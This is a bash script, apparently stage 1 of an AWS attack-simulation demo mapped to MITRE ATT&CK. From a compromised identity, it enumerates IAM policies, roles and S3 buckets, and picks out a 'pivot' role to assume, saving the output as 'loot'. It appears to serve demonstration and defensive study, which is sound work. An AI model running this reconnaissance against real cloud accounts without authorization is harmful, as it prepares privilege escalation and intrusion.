#!/usr/bin/env bash
# Stage 1 — Discovery (T1580 Cloud Infra Discovery, T1087.004 Account Discovery)
# Enumerates what the compromised identity can see: its own permissions, other
# users, roles, and assume-role targets. This is what Pacu's enum modules do;
# scripting it keeps the demo reproducible without the full framework.
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

phase "Stage 1 — Discovery"

whoami_arn="$(att sts get-caller-identity --query Arn --output text)"
user_name="${whoami_arn##*/}"
step "Acting as user: $user_name"

step "Enumerating attached and inline policies for self"
att iam list-user-policies --user-name "$user_name" \
  --output json | tee "$LOOT_DIR/01-self-inline-policies.json"
att iam list-attached-user-policies --user-name "$user_name" \
  --output json | tee "$LOOT_DIR/01-self-attached-policies.json"

step "Enumerating roles reachable in the account"
att iam list-roles --query 'Roles[].{Name:RoleName,Arn:Arn}' \
  --output json | tee "$LOOT_DIR/01-roles.json" >/dev/null
role_count="$(att iam list-roles --query 'length(Roles)' --output text)"
ok "Discovered $role_count roles"

step "Looking for roles this user is trusted to assume (pivot candidates)"
pivot_arn="$(att iam list-roles \
  --query "Roles[?contains(RoleName, 'pivot')].Arn | [0]" --output text)"
if [[ -n "$pivot_arn" && "$pivot_arn" != "None" ]]; then
  echo "$pivot_arn" > "$LOOT_DIR/pivot_role_arn"
  ok "Pivot role identified: $pivot_arn"
else
  warn "No pivot role found by name; check trust policies manually."
fi

step "Enumerating S3 buckets"
att s3api list-buckets --query 'Buckets[].Name' \
  --output json | tee "$LOOT_DIR/01-buckets.json" >/dev/null

echo "MITRE: T1580 Cloud Infrastructure Discovery, T1087.004 Cloud Account Discovery"
ok "Discovery complete — evidence written to $LOOT_DIR"
